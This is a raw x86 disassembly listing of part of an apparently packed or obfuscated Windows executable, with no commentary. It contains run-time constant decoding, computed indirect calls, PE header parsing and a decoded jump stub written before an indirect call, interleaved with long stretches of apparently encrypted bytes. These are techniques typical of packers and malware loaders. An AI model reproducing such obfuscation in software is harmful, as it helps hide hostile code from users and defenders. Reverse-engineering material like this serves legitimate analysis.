  4060dc:	push   DWORD PTR ds:0x409278
  4060e2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4060e6:	push   DWORD PTR ds:0x409024
  4060ec:	add    eax,ecx
  4060ee:	mov    ecx,DWORD PTR ds:0x4091a0
  4060f4:	mov    ecx,DWORD PTR [ecx+0x194]
  4060fa:	push   DWORD PTR [ecx]
  4060fc:	call   eax
  4060fe:	mov    ecx,DWORD PTR ds:0x4091a0
  406104:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40610a:	mov    DWORD PTR [ecx],eax
  40610c:	jmp    0x4063cb
  406111:	mov    eax,DWORD PTR [ebp-0x20]
  406114:	mov    ecx,DWORD PTR [ebp-0x74]
  406117:	xor    eax,esi
  406119:	add    eax,ebx
  40611b:	mov    edi,0xf89c85f5
  406120:	cmp    eax,ecx
  406122:	jne    0x406223
  406128:	mov    eax,DWORD PTR [ebp-0x20]
  40612b:	xor    eax,esi
  40612d:	add    eax,ebx
  40612f:	mov    ds:0x409224,eax
  406134:	mov    eax,DWORD PTR [ebp-0x20]
  406137:	xor    eax,esi
  406139:	add    eax,ebx
  40613b:	mov    ds:0x40921c,eax
  406140:	mov    eax,DWORD PTR [ebp-0x18]
  406143:	mov    DWORD PTR [ebp-0x8],eax
  406146:	mov    eax,DWORD PTR [ebp-0x20]
  406149:	mov    DWORD PTR [ebp+0xc],eax
  40614c:	mov    eax,DWORD PTR [ebp+0xc]
  40614f:	xor    eax,esi
  406151:	add    eax,ebx
  406153:	mov    DWORD PTR [ebp+0xc],eax
  406156:	mov    eax,ds:0x409020
  40615b:	mov    eax,DWORD PTR [eax]
  40615d:	mov    DWORD PTR [ebp+0xc],eax
  406160:	mov    eax,ds:0x409228
  406165:	mov    eax,DWORD PTR [eax]
  406167:	mov    DWORD PTR [ebp-0x60],eax
  40616a:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  406171:	mov    eax,DWORD PTR [ebp+0x10]
  406174:	xor    eax,esi
  406176:	add    eax,ebx
  406178:	mov    DWORD PTR [ebp+0x10],eax
  40617b:	mov    eax,ds:0x4091a0
  406180:	mov    DWORD PTR [ebp+0x10],eax
  406183:	mov    eax,DWORD PTR [ebp+0xc]
  406186:	mov    DWORD PTR [ebp+0x10],eax
  406189:	mov    eax,DWORD PTR [ebp+0x10]
  40618c:	push   0x4
  40618e:	pop    ecx
  40618f:	sub    ecx,eax
  406191:	add    ecx,DWORD PTR [ebp-0x60]
  406194:	mov    DWORD PTR [ebp-0x34],edi
  406197:	mov    DWORD PTR [ebp-0x10],ecx
  40619a:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  4061a4:	mov    eax,DWORD PTR [ebp+0x10]
  4061a7:	mov    DWORD PTR [ebp-0xc4],eax
  4061ad:	mov    eax,DWORD PTR [ebp-0x10]
  4061b0:	mov    DWORD PTR [ebp-0xc0],eax
  4061b6:	mov    eax,DWORD PTR [ebp-0x34]
  4061b9:	xor    eax,esi
  4061bb:	add    eax,ebx
  4061bd:	mov    DWORD PTR [ebp-0xbc],eax
  4061c3:	lea    eax,[ebp-0x80]
  4061c6:	mov    DWORD PTR [ebp-0xb8],eax
  4061cc:	mov    eax,DWORD PTR [ebp-0xc8]
  4061d2:	xor    eax,esi
  4061d4:	add    eax,ebx
  4061d6:	mov    DWORD PTR [ebp-0xc8],eax
  4061dc:	lea    eax,[ebp-0xc8]
  4061e2:	push   eax
  4061e3:	mov    eax,DWORD PTR [ebp-0x8]
  4061e6:	xor    eax,esi
  4061e8:	add    eax,ebx
  4061ea:	push   eax
  4061eb:	mov    eax,ds:0x4091c0
  4061f0:	push   0x409116
  4061f5:	push   DWORD PTR [eax]
  4061f7:	call   0x406f1d
  4061fc:	and    DWORD PTR [ebp+0xc],0x0
  406200:	mov    eax,DWORD PTR [ebp-0x10]
  406203:	sub    eax,DWORD PTR [ebp+0xc]
  406206:	push   eax
  406207:	mov    eax,DWORD PTR [ebp+0x10]
  40620a:	add    eax,DWORD PTR [ebp+0xc]
  40620d:	push   eax
  40620e:	call   0x40196f
  406213:	inc    DWORD PTR [ebp+0xc]
  406216:	cmp    DWORD PTR [ebp+0xc],0x52
  40621a:	jb     0x406200
  406220:	mov    eax,DWORD PTR [ebp-0x8]
  406223:	mov    eax,ds:0x4091a0
  406228:	mov    DWORD PTR [ebp+0x10],eax
  40622b:	mov    eax,ds:0x4092ac
  406230:	mov    DWORD PTR [ebp-0x68],eax
  406233:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  40623a:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  406241:	mov    eax,DWORD PTR [ebp+0xc]
  406244:	xor    eax,esi
  406246:	add    eax,ebx
  406248:	mov    DWORD PTR [ebp-0x7c],eax
  40624b:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  406252:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40625c:	mov    DWORD PTR [ebp-0x78],edi
  40625f:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  406266:	mov    eax,DWORD PTR [ebp+0xc]
  406269:	xor    eax,esi
  40626b:	add    eax,ebx
  40626d:	mov    DWORD PTR [ebp-0x38],eax
  406270:	mov    DWORD PTR [ebp-0x48],0xf89c8530
  406277:	mov    BYTE PTR [ebp-0x29],0x57
  40627b:	mov    eax,DWORD PTR [ebp+0xc]
  40627e:	xor    eax,esi
  406280:	add    eax,ebx
  406282:	mov    DWORD PTR [ebp-0x38],eax
  406285:	mov    eax,DWORD PTR [ebp-0x64]
  406288:	xor    eax,esi
  40628a:	add    eax,ebx
  40628c:	push   eax
  40628d:	mov    eax,DWORD PTR [ebp-0x70]
  406290:	xor    eax,esi
  406292:	add    eax,ebx
  406294:	push   eax
  406295:	mov    eax,DWORD PTR [ebp-0x48]
  406298:	xor    eax,esi
  40629a:	add    eax,ebx
  40629c:	push   eax
  40629d:	lea    eax,[ebp-0x10c]
  4062a3:	push   eax
  4062a4:	push   DWORD PTR [ebp+0xc]
  4062a7:	push   DWORD PTR [ebp-0x4]
  4062aa:	call   0x40467f
  4062af:	test   eax,eax
  4062b1:	je     0x4062e2
  4062b7:	lea    eax,[ebp-0x10c]
  4062bd:	push   eax
  4062be:	mov    eax,DWORD PTR [ebp-0x4]
  4062c1:	xor    eax,esi
  4062c3:	add    eax,ebx
  4062c5:	push   eax
  4062c6:	mov    eax,DWORD PTR [ebp+0x10]
  4062c9:	add    eax,0xaa
  4062ce:	push   eax
  4062cf:	mov    eax,DWORD PTR [ebp+0x10]
  4062d2:	mov    eax,DWORD PTR [eax+0x198]
  4062d8:	push   DWORD PTR [eax]
  4062da:	call   0x406f1d
  4062df:	mov    DWORD PTR [ebp-0x24],eax
  4062e2:	cmp    DWORD PTR [ebp-0x24],0x0
  4062e6:	lea    edi,[ebp+0x4]
  4062e9:	mov    DWORD PTR [ebp-0x7c],edi
  4062ec:	je     0x4063b6
  4062f2:	lea    eax,[ebp-0x38]
  4062f5:	push   eax
  4062f6:	mov    eax,DWORD PTR [ebp-0x78]
  4062f9:	xor    eax,esi
  4062fb:	add    eax,ebx
  4062fd:	push   eax
  4062fe:	mov    eax,DWORD PTR [ebp-0x48]
  406301:	xor    eax,esi
  406303:	add    eax,ebx
  406305:	push   eax
  406306:	push   DWORD PTR [ebp-0x24]
  406309:	lea    eax,[ebp-0x10c]
  40630f:	push   eax
  406310:	push   DWORD PTR [ebp+0xc]
  406313:	push   DWORD PTR [ebp-0x4]
  406316:	call   0x404cef
  40631b:	test   eax,eax
  40631d:	je     0x40634b
  406323:	lea    eax,[ebp-0x10c]
  406329:	push   eax
  40632a:	mov    eax,DWORD PTR [ebp-0x4]
  40632d:	xor    eax,esi
  40632f:	add    eax,ebx
  406331:	push   eax
  406332:	mov    eax,DWORD PTR [ebp+0x10]
  406335:	add    eax,0xee
  40633a:	push   eax
  40633b:	mov    eax,DWORD PTR [ebp+0x10]
  40633e:	mov    eax,DWORD PTR [eax+0x198]
  406344:	push   DWORD PTR [eax]
  406346:	call   0x406f1d
  40634b:	mov    ecx,DWORD PTR [ebp-0x48]
  40634e:	xor    ecx,esi
  406350:	mov    eax,0xffcd8d62
  406355:	sub    eax,ecx
  406357:	sub    eax,DWORD PTR [ebp-0x24]
  40635a:	mov    ecx,DWORD PTR [ebp-0x68]
  40635d:	add    ecx,eax
  40635f:	mov    eax,DWORD PTR [ebp-0x24]
  406362:	mov    DWORD PTR [eax+0x1],ecx
  406365:	mov    al,BYTE PTR [ebp-0x29]
  406368:	mov    ecx,DWORD PTR [ebp-0x24]
  40636b:	xor    al,0x49
  40636d:	sub    al,0x35
  40636f:	mov    BYTE PTR [ecx],al
  406371:	lea    eax,[ebp-0x24]
  406374:	inc    BYTE PTR [eax]
  406376:	inc    eax
  406377:	push   eax
  406378:	pop    ecx
  406379:	dec    ecx
  40637a:	xchg   ecx,edx
  40637c:	dec    BYTE PTR [edx]
  40637e:	push   DWORD PTR [ebp+0x10]
  406381:	mov    eax,ds:0x40925c
  406386:	mov    eax,DWORD PTR [eax]
  406388:	push   DWORD PTR [eax]
  40638a:	lea    eax,ds:0x409278
  406390:	push   DWORD PTR [eax]
  406392:	lea    eax,ds:0x409024
  406398:	push   DWORD PTR [eax]
  40639a:	lea    eax,ds:0x409258
  4063a0:	push   DWORD PTR [eax]
  4063a2:	lea    eax,ds:0x409390
  4063a8:	push   DWORD PTR [eax]
  4063aa:	xchg   ebx,edx
  4063ac:	inc    ebx
  4063ad:	inc    ebx
  4063ae:	sub    ebx,0x3
  4063b1:	push   ebx
  4063b2:	pop    eax
  4063b3:	call   DWORD PTR [eax+0x1]
  4063b6:	mov    DWORD PTR [ebp-0x6c],edi
  4063b9:	mov    eax,DWORD PTR [ebp-0x3c]
  4063bc:	mov    eax,DWORD PTR [ebp-0x18]
  4063bf:	push   DWORD PTR [ebp-0x20]
  4063c2:	lea    eax,[ebp-0x6c]
  4063c5:	push   eax
  4063c6:	call   0x4034f6
  4063cb:	mov    eax,ds:0x4091a0
  4063d0:	push   0x4
  4063d2:	add    eax,0x1cc
  4063d7:	push   eax
  4063d8:	lea    eax,[ebp-0x3c]
  4063db:	push   eax
  4063dc:	call   0x402c87
  4063e1:	mov    eax,DWORD PTR [ebp-0x3c]
  4063e4:	mov    eax,DWORD PTR [eax]
  4063e6:	pop    edi
  4063e7:	pop    esi
  4063e8:	pop    ebx
  4063e9:	leave  
  4063ea:	ret    0xc
  4063ed:	push   ebp
  4063ee:	mov    ebp,esp
  4063f0:	sub    esp,0x20
  4063f3:	leave  
  4063f4:	ret    0x4
  4063f7:	push   ebp
  4063f8:	mov    ebp,esp
  4063fa:	push   ecx
  4063fb:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  406402:	sub    eax,DWORD PTR ds:0x4292d9
  406408:	mov    eax,DWORD PTR [ebp+0x8]
  40640b:	or     DWORD PTR ds:0x42759c,0x4292bd
  406415:	mov    al,BYTE PTR [eax]
  406417:	add    al,0x35
  406419:	and    DWORD PTR ds:0x427cf7,0x42c89e
  406423:	xor    al,0x49
  406425:	mov    DWORD PTR ds:0x4292a9,0x8ce
  40642f:	cmp    al,0xcb
  406431:	mov    DWORD PTR ds:0x4292d5,0x323c
  40643b:	jne    0x4064e2
  406441:	and    DWORD PTR ds:0x4292c1,0x0
  40644b:	xor    ecx,ecx
  40644d:	or     ecx,DWORD PTR ds:0x4292c1
  406453:	inc    ecx
  406454:	mov    DWORD PTR ds:0x4292c1,ecx
  40645a:	cmp    DWORD PTR ds:0x4292c1,0xa
  406461:	jne    0x40647a
  406467:	push   DWORD PTR [ebp-0x18]
  40646a:	push   0x641f
  40646f:	push   0x4275a8
  406474:	call   DWORD PTR ds:0x427ac3
  40647a:	cmp    DWORD PTR ds:0x4292c1,0x9
  406481:	jne    0x406496
  406487:	xor    ecx,ecx
  406489:	or     ecx,DWORD PTR ds:0x4292c1
  40648f:	inc    ecx
  406490:	mov    DWORD PTR ds:0x4292c1,ecx
  406496:	cmp    DWORD PTR ds:0x4292c1,0x1d
  40649d:	jb     0x40644b
  4064a3:	mov    eax,DWORD PTR [ebp+0x8]
  4064a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4064a9:	add    ecx,DWORD PTR [eax+0x3c]
  4064ac:	mov    edx,0x7510857
  4064b1:	mov    DWORD PTR [ebp+0x8],ecx
  4064b4:	mov    eax,DWORD PTR [ebp-0x4]
  4064b7:	xor    eax,edx
  4064b9:	push   esi
  4064ba:	mov    esi,DWORD PTR [ebp+0x8]
  4064bd:	mov    ecx,0x32729e
  4064c2:	add    eax,ecx
  4064c4:	cmp    DWORD PTR [esi+0x54],eax
  4064c7:	pop    esi
  4064c8:	je     0x4064d6
  4064ce:	mov    eax,DWORD PTR [ebp+0x8]
  4064d1:	jmp    0x4064ef
  4064d6:	mov    eax,DWORD PTR [ebp-0x4]
  4064d9:	xor    eax,edx
  4064db:	add    eax,ecx
  4064dd:	jmp    0x4064ef
  4064e2:	mov    eax,DWORD PTR [ebp-0x4]
  4064e5:	xor    eax,0x7510857
  4064ea:	add    eax,0x32729e
  4064ef:	leave  
  4064f0:	ret    0x4
  4064f3:	push   ebp
  4064f4:	mov    ebp,esp
  4064f6:	push   ecx
  4064f7:	push   ecx
  4064f8:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  4064ff:	xor    DWORD PTR ds:0x427d1b,0x4292a5
  406509:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  406510:	mov    eax,DWORD PTR [ebp-0x4]
  406513:	push   esi
  406514:	mov    esi,DWORD PTR [ebp-0x8]
  406517:	xor    DWORD PTR ds:0x427d03,0x39
  406521:	jmp    0x40669a
  406526:	mov    al,cs:0xfbf5fbf3
  40652c:	data16 jge 0x40659b
  40652f:	inc    ecx
  406530:	xor    eax,0x3a7baf5e
  406535:	sbb    al,0x7f
  406537:	sub    DWORD PTR [esp+edi*2-0x28],edi
  40653b:	jg     0x4065b9
  40653d:	jl     0x406537
  40653f:	xor    al,BYTE PTR ds:0x4952a00f
  406545:	push   ebx
  406546:	push   edx
  406547:	loopne 0x4064e9
  406549:	lea    esp,[eax+0x3a]
  40654c:	push   es
  40654d:	imul   edi,DWORD PTR [edi-0x44],0x21
  406551:	mov    cl,0x10
  406553:	call   DWORD PTR [edx-0x28]
  406556:	adc    DWORD PTR [ebx-0x62c76b26],ebx
  40655c:	or     ch,BYTE PTR [ecx-0x52]
  40655f:	dec    ebx
  406560:	sbb    BYTE PTR [ecx+0xf],bl
  406563:	mov    dh,0x16
  406565:	mov    al,cs:0xe814229a
  40656b:	cld    
  40656c:	and    al,0x87
  40656e:	gs dec edi
  406570:	dec    edi
  406571:	popa   
  406572:	aaa    
  406573:	or     ebx,ebp
  406575:	repz fcmovb st,st(5)
  406578:	dec    edi
  406579:	ins    BYTE PTR es:[edi],dx
  40657a:	jo     0xc8268050
  406580:	mov    bh,0xb2
  406582:	fs pushf 
  406584:	add    bl,ah
  406586:	mov    cl,0x61
  406588:	out    0x6,eax
  40658a:	(bad)  
  40658c:	xor    eax,0x73e7f896
  406591:	(bad)  
  406592:	ds dec esp
  406594:	out    dx,al
  406595:	or     al,0xa9
  406597:	sbb    eax,0xed725c5c
  40659c:	in     eax,dx
  40659d:	sbb    al,bl
  40659f:	cdq    
  4065a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065a1:	pop    ebx
  4065a2:	in     eax,dx
  4065a3:	mov    BYTE PTR [esi-0x75],bl
  4065a6:	jle    0x406614
  4065a8:	aad    0x15
  4065aa:	and    bh,BYTE PTR ds:[ebp-0x24]
  4065ae:	lods   al,BYTE PTR ds:[esi]
  4065af:	call   0xf1b3:0x7c94f0cb
  4065b6:	jmp    0xa2d4a546
  4065bb:	dec    edi
  4065bc:	pop    ds
  4065bd:	(bad)  
  4065be:	std    
  4065bf:	push   ss
  4065c0:	pop    eax
  4065c1:	(bad)  [ebx+edx*8-0x49713873]
  4065c8:	push   0xbe2584ae
  4065cd:	hlt    
  4065ce:	ja     0x40658c
  4065d0:	cmp    BYTE PTR [esi-0x77],dl
  4065d3:	sahf   
  4065d4:	push   ecx
  4065d5:	mov    esp,0x107e904a
  4065da:	lds    ecx,FWORD PTR [edi-0x71c92481]
  4065e0:	xchg   esi,eax
  4065e1:	push   es
  4065e2:	neg    BYTE PTR [edi-0x6a274ed7]
  4065e8:	cmp    eax,0x6d30a548
  4065ed:	ins    DWORD PTR es:[edi],dx
  4065ee:	(bad)  
  4065ef:	call   0x771ce62a
  4065f4:	stos   BYTE PTR es:[edi],al
  4065f5:	fmul   DWORD PTR [eax]
  4065f7:	and    al,0xba
  4065f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065fa:	scas   al,BYTE PTR es:[edi]
  4065fb:	ret    0xeb8b
  4065fe:	pop    ebp
  4065ff:	mov    ah,0x72
  406601:	lea    esp,[esi-0x70518a79]
  406607:	enter  0xed89,0xf1
  40660b:	addr16 iret 
  40660d:	popa   
  40660e:	pop    es
  40660f:	jns    0x406678
  406611:	xchg   esp,eax
  406612:	in     eax,0x4
  406614:	shl    al,cl
  406616:	sub    al,0x63
  406618:	jmp    0x4065aa
  40661a:	xchg   esp,eax
  40661b:	aaa    
  40661c:	outs   dx,DWORD PTR ds:[esi]
  40661d:	fisubr WORD PTR [edi-0x6096d2de]
  406623:	xchg   ebp,eax
  406624:	add    al,BYTE PTR [edx+0x49]
  406627:	imul   BYTE PTR [edi-0x7bb0d2b8]
  40662d:	fmulp  st(2),st
  40662f:	daa    
  406630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406631:	sbb    DWORD PTR [edi+edx*1+0x3c],0x807ef05d
  406639:	xchg   DWORD PTR [ecx-0x1110e457],edx
  40663f:	cmp    BYTE PTR [edx+0x2ca666b7],al
  406645:	sbb    eax,0x652cb822
  40664a:	out    dx,eax
  40664b:	jp     0x406695
  40664d:	retf   
  40664e:	retf   0xfed8
  406651:	sub    al,0x2a
  406653:	jae    0x406675
  406655:	cmp    dl,al
  406657:	lods   al,BYTE PTR ds:[esi]
  406658:	lock push ebx
  40665a:	dec    esp
  40665b:	add    cl,al
  40665d:	cs or  al,0x7d
  406660:	bswap  ebp
  406662:	mov    eax,ds:0x850db200
  406667:	nop
  406668:	push   esp
  406669:	sbb    DWORD PTR [ebx-0x740bdd93],ecx
  40666f:	out    dx,al
  406670:	jb     0x40660b
  406672:	scas   eax,DWORD PTR es:[edi]
  406673:	cmc    
  406674:	push   ebx
  406675:	pop    ss
  406676:	push   cs
  406677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406678:	jns    0x4066b4
  40667a:	pushf  
  40667b:	mov    ebx,0x3d0f3c0e
  406680:	xor    ebx,DWORD PTR [edx+0x554db82d]
  406686:	out    dx,al
  406687:	loopne 0x406690
  406689:	ja     0x4066fc
  40668b:	xchg   ecx,eax
  40668c:	fild   DWORD PTR [ebp+0x61]
  40668f:	sbb    BYTE PTR [eax],dh
  406691:	imul   BYTE PTR [ebx+0x6b8f28fa]
  406697:	add    DWORD PTR [esi-0x30],esp
  40669a:	mov    edx,0x7510857
  40669f:	xor    eax,edx
  4066a1:	adc    DWORD PTR ds:0x4292a5,0x7cf1
  4066ab:	xor    esi,edx
  4066ad:	mov    ecx,0x32729e
  4066b2:	sbb    DWORD PTR ds:0x42c89a,0x427594
  4066bc:	add    esi,ecx
  4066be:	or     DWORD PTR ds:0x42c892,0x2710
  4066c8:	add    eax,ecx
  4066ca:	sbb    DWORD PTR ds:0x4292b5,0x4275ac
  4066d4:	imul   eax,esi
  4066d7:	mov    DWORD PTR ds:0x42c896,0x5e2a
  4066e1:	mov    esi,DWORD PTR [ebp+0xc]
  4066e4:	mov    DWORD PTR ds:0x427d03,0x704c
  4066ee:	cmp    esi,eax
  4066f0:	mov    DWORD PTR ds:0x427d1f,0x38e6
  4066fa:	jne    0x4068f9
  406700:	mov    DWORD PTR ds:0x4275b0,0x11
  40670a:	cmp    DWORD PTR ds:0x4275b0,0x0
  406711:	je     0x40675a
  406717:	cmp    DWORD PTR ds:0x4275b0,0x1b
  40671e:	jne    0x406746
  406724:	push   DWORD PTR [ebp-0x28]
  406727:	push   0x3cc8
  40672c:	push   0x5307
  406731:	push   0x1b9a
  406736:	push   0x3e4a
  40673b:	push   0x4274
  406740:	call   DWORD PTR ds:0x427c6b
  406746:	xor    esi,esi
  406748:	or     esi,DWORD PTR ds:0x4275b0
  40674e:	dec    esi
  40674f:	mov    DWORD PTR ds:0x4275b0,esi
  406755:	jmp    0x40670a
  40675a:	mov    eax,DWORD PTR [ebp-0x4]
  40675d:	xor    esi,esi
  40675f:	xor    esi,DWORD PTR ds:0x42c8de
  406765:	mov    esi,DWORD PTR [esi]
  406767:	adc    DWORD PTR ds:0x4292d5,esi
  40676d:	mov    esi,DWORD PTR [ebp-0x8]
  406770:	xor    eax,edx
  406772:	xor    esi,edx
  406774:	add    eax,ecx
  406776:	add    esi,ecx
  406778:	jmp    0x4068f1
  40677d:	dec    eax
  40677e:	cmp    al,0x31
  406780:	and    ecx,DWORD PTR [ebp+0x25]
  406783:	jp     0x4067ec
  406785:	pop    edx
  406786:	inc    esp
  406787:	push   cs
  406788:	and    eax,0x9a99c428
  40678d:	fld    TBYTE PTR [eax]
  40678f:	jl     0x40680d
  406791:	fdivr  DWORD PTR [edi+0x7c]
  406794:	jl     0x40676b
  406796:	sub    DWORD PTR [ebp+0x60385d35],edi
  40679c:	push   ecx
  40679d:	dec    ebx
  40679e:	in     eax,0xeb
  4067a0:	mov    esp,0x4f498f09
  4067a5:	jo     0x147b1e47
  4067ab:	dec    ebx
  4067ac:	sbb    DWORD PTR [edx+0x57],ebx
  4067af:	pop    ss
  4067b0:	loope  0x4067ce
  4067b2:	xchg   esi,eax
  4067b3:	sub    al,0xd7
  4067b5:	(bad)  
  4067b6:	mov    WORD PTR [edi-0x51590933],fs
  4067bc:	sbb    DWORD PTR [edx+ebx*1+0xd],edx
  4067c0:	pop    eax
  4067c1:	je     0x40679f
  4067c3:	fwait
  4067c4:	inc    edx
  4067c5:	je     0x40681e
  4067c7:	rcl    DWORD PTR [eax],0x50
  4067ca:	test   al,0xb9
  4067cc:	mov    ch,0x9e
  4067ce:	(bad)  
  4067cf:	out    dx,al
  4067d0:	popa   
  4067d1:	xor    BYTE PTR [edx-0x21684ff6],bl
  4067d7:	mov    ah,0x4d
  4067d9:	dec    ebx
  4067da:	pop    es
  4067db:	fwait
  4067dc:	pop    edi
  4067dd:	push   0x57e41997
  4067e2:	bound  ecx,QWORD PTR [ecx-0x67]
  4067e5:	xchg   edi,edi
  4067e7:	adc    ah,BYTE PTR ds:0x58616af2
  4067ed:	mov    ds:0xcbc347a9,eax
  4067f2:	inc    esi
  4067f3:	pop    esp
  4067f4:	test   BYTE PTR [esi+ebp*8-0x41],al
  4067f8:	and    ecx,eax
  4067fa:	pop    ss
  4067fb:	into   
  4067fc:	imul   edx,DWORD PTR [esi],0xffffffe1
  4067ff:	outs   dx,DWORD PTR ds:[esi]
  406800:	push   0xeb29a573
  406805:	scas   al,BYTE PTR es:[edi]
  406806:	scas   al,BYTE PTR es:[edi]
  406807:	add    edi,DWORD PTR [esi-0x45fef22]
  40680d:	and    eax,0x38ef45b
  406812:	inc    ebx
  406813:	(bad)  
  406814:	sti    
  406815:	sahf   
  406816:	mov    ebx,0x650b84f5
  40681b:	ja     0x406822
  40681d:	inc    BYTE PTR [esi-0x7277cf9c]
  406823:	or     al,0xd9
  406825:	and    ecx,DWORD PTR [edi-0x5902eb42]
  40682b:	or     al,0x56
  40682d:	ret    
  40682e:	cs mov ebp,0x12dddf5e
  406834:	es pop ebp
  406836:	shl    DWORD PTR [ecx],cl
  406838:	(bad)  
  406839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40683a:	test   DWORD PTR [edi+0x41],esp
  40683d:	fistp  WORD PTR [eax]
  40683f:	inc    esi
  406840:	jnp    0x40688f
  406842:	dec    edi
  406843:	enter  0x5e9,0xee
  406847:	sub    al,0x21
  406849:	dec    edx
  40684a:	ret    0xfdc8
  40684d:	add    DWORD PTR [ecx],0xe
  406850:	cmp    ch,BYTE PTR [eax+0x3f]
  406853:	pop    ebx
  406854:	ja     0x4067ed
  406856:	mov    ebp,0xf6c0c180
  40685b:	adc    al,bh
  40685d:	mov    eax,ds:0x9892eac3
  406862:	dec    ebx
  406863:	ja     0x406812
  406865:	sub    bh,BYTE PTR [edi+ebx*4]
  406868:	xlat   BYTE PTR ds:[ebx]
  406869:	fsubr  QWORD PTR [ebx+0x24]
  40686c:	dec    ebp
  40686d:	cmp    BYTE PTR [esi],0xa4
  406870:	mov    ecx,0x74b88183
  406875:	outs   dx,DWORD PTR ds:[esi]
  406876:	mov    al,ds:0xf9292e82
  40687b:	sbb    ch,al
  40687d:	cwde   
  40687e:	and    DWORD PTR [ebx],eax
  406880:	sbb    BYTE PTR ds:0x31bd6795,0xef
  406887:	jmp    0x7f13:0xbf766fea
  40688e:	sub    eax,0xd5501c4c
  406893:	retf   0x47de
  406896:	or     esi,eax
  406898:	push   0xffffff8a
  40689a:	retf   
  40689b:	pop    edi
  40689c:	ror    ah,0x34
  40689f:	dec    eax
  4068a0:	push   ebp
  4068a1:	mov    esp,0xde65f36e
  4068a6:	stc    
  4068a7:	js     0x40686f
  4068a9:	inc    esp
  4068aa:	cmp    ebx,DWORD PTR [edi]
  4068ac:	stos   DWORD PTR es:[edi],eax
  4068ad:	cmp    eax,0xfc088ff3
  4068b2:	xor    eax,0x4e96786b
  4068b7:	data16 js 0x40688e
  4068ba:	pop    esi
  4068bb:	js     0x40688f
  4068bd:	pop    edx
  4068be:	mov    esi,0xb57e9991
  4068c3:	mov    cl,0xb1
  4068c5:	cwde   
  4068c6:	dec    edi
  4068c7:	sbb    al,0xe1
  4068c9:	cwde   
  4068ca:	jo     0x406886
  4068cc:	daa    
  4068cd:	add    al,0x43
  4068cf:	test   edx,ebp
  4068d1:	cs push 0xec970704
  4068d7:	mov    edx,0x7bcfb368
  4068dc:	icebp  
  4068dd:	clc    
  4068de:	jno    0x406932
  4068e0:	out    0xfa,al
  4068e2:	push   ebx
  4068e3:	and    edx,eax
  4068e5:	clc    
  4068e6:	push   cs
  4068e7:	mov    ecx,0x3a847785
  4068ec:	push   ds
  4068ed:	push   ds
  4068ee:	ffreep st(5)
  4068f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068f1:	imul   eax,esi
  4068f4:	jmp    0x406f18
  4068f9:	mov    eax,DWORD PTR [ebp+0xc]
  4068fc:	jmp    0x406a75
  406901:	mov    eax,0x65210ec9
  406906:	stc    
  406907:	mov    ebx,0x4f39e44d
  40690c:	pop    ebp
  40690d:	ret    0xac4b
  406910:	mov    esp,DWORD PTR [edi-0x278383d5]
  406916:	jg     0x406994
  406918:	jl     0x4068d7
  40691a:	mov    ch,0x2c
  40691c:	rol    BYTE PTR [ecx],1
  40691e:	in     eax,0xf9
  406920:	stos   DWORD PTR es:[edi],eax
  406921:	add    DWORD PTR [ecx-0x3bbe87d9],ebx
  406927:	jmp    0x587ae549
  40692c:	mov    cl,0x8
  40692e:	lods   al,BYTE PTR ds:[esi]
  40692f:	aas    
  406930:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406931:	xor    BYTE PTR [ebx-0x37df8d41],ah
  406937:	fistp  DWORD PTR [ecx+0x7d276845]
  40693d:	cmc    
  40693e:	mov    ds:0x3c22e14e,al
  406943:	push   ebp
  406944:	and    edx,DWORD PTR [ebx+0x69734e39]
  40694a:	push   cs
  40694b:	ficom  WORD PTR [esi-0x105253e4]
  406951:	pushf  
  406952:	cli    
  406953:	add    BYTE PTR [ebx-0x67],ch
  406956:	xor    ebp,DWORD PTR [esi]
  406958:	in     eax,0x68
  40695a:	pop    edi
  40695b:	pop    ebp
  40695c:	cmp    eax,0xaa16e4cd
  406961:	push   ds
  406962:	xchg   edi,eax
  406963:	data16 aam 0x20
  406966:	je     0x4069bc
  406968:	(bad)  
  406969:	gs mov ah,0xbe
  40696c:	sar    DWORD PTR [eax+0x763d23a],1
  406972:	adc    DWORD PTR [ecx+eax*8],esp
  406975:	lds    eax,FWORD PTR ds:[ebx-0x2a008518]
  40697c:	or     al,0xa2
  40697e:	sar    DWORD PTR [edx-0x2489e433],cl
  406984:	mov    edx,0xad127815
  406989:	imul   ebp,DWORD PTR [esi-0x49],0xffffffe7
  40698d:	imul   esi,DWORD PTR [edi+edx*2+0x73],0xd7406b27
  406995:	ds xor al,0x96
  406998:	ins    DWORD PTR es:[edi],dx
  406999:	xchg   edi,eax
  40699a:	lods   al,BYTE PTR ds:[esi]
  40699b:	inc    esp
  40699c:	add    eax,0xc8853797
  4069a1:	mov    eax,ds:0xecaa378c
  4069a6:	stos   DWORD PTR es:[edi],eax
  4069a7:	xchg   ecx,eax
  4069a8:	push   esp
  4069a9:	cmp    DWORD PTR [ebx],eax
  4069ab:	(bad)  
  4069ac:	test   DWORD PTR [esp+ebx*1+0x17571487],0xb3db971a
  4069b7:	xor    bl,BYTE PTR [edi+edx*1+0x4d]
  4069bb:	popa   
  4069bc:	aam    0x6d
  4069be:	mov    eax,ds:0x6e3145c8
  4069c3:	loop   0x4069c7
  4069c5:	sub    bl,BYTE PTR [edx+0x4e]
  4069c8:	mov    al,0xa2
  4069ca:	ins    BYTE PTR es:[edi],dx
  4069cb:	mov    ah,0x47
  4069cd:	jns    0x4069dc
  4069cf:	pop    ds
  4069d0:	push   ecx
  4069d1:	sub    BYTE PTR [edi],0xda
  4069d4:	stos   DWORD PTR es:[edi],eax
  4069d5:	pop    ds
  4069d6:	arpl   WORD PTR [edi-0x27edf934],sp
